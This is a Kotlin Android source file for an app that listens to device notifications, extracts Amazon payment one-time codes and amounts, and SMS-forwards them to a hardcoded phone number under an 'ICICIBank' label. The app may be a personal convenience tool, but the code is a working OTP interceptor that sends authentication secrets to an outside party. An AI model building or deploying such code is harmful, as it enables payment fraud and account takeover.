package com.example.fwdamazoncardotp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.widget.Toast
import java.util.Locale
import java.util.regex.Pattern

class SMSReceiver : NotificationListenerService() {

    companion object {
        var lastMessage: String? = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val notification = sbn?.notification ?: return
        val extras = notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: return

        // Heuristic check: from Messages or OTP source
        if (text.contains("AMAZON", true) &&
            text.contains("OTP", true) &&
            text.contains("1007", true)) {

            // Prevent duplicates
            if (text == lastMessage) return
            lastMessage = text

            val (code, amount) = extractCodeAndAmount(text)

            if (code != null && amount != null) {
                val codemsg = "One Time Code for Amazon Payment of $amount is $code"
                Handler(Looper.getMainLooper()).postDelayed({
                    forwardMessage(this, "ICICIBank", codemsg)
                }, 5000)
            }
        }
    }

    private fun extractCodeAndAmount(messageBody: String): Pair<String?, String?> {
        // Regex patterns to find a 6-digit code and an amount in INR format
        val codePattern = "\\b(\\d{6})\\b"
        val amountPattern = "\\b(INR \\d+(?:\\.\\d{1,2})?)\\b"

        val codeMatcher = Pattern.compile(codePattern).matcher(messageBody)
        val amountMatcher = Pattern.compile(amountPattern).matcher(messageBody)

        val code = if (codeMatcher.find()) {
            codeMatcher.group(1) // Return the first 6-digit code found
        } else {
            null // Return null if no code is found
        }

        val amount = if (amountMatcher.find()) {
            amountMatcher.group(1) // Return the first amount found
        } else {
            null // Return null if no amount is found
        }

        return Pair(code, amount) // Return both code and amount as a Pair
    }

    private fun forwardMessage(context: Context?, sender: String?, codemsg: String) {
        val forwardNumber = "7989050647" // Replace with the number to forward to

        // Send the extracted code and amount instead of the entire message
        val smsManager: SmsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            context!!.getSystemService(SmsManager::class.java)
        } else {
            SmsManager.getDefault()
        }
        smsManager.sendTextMessage(forwardNumber, null, "Message from $sender: $codemsg", null, null)

        Toast.makeText(context, "OTP message forwarded: $codemsg", Toast.LENGTH_SHORT).show()
    }
}
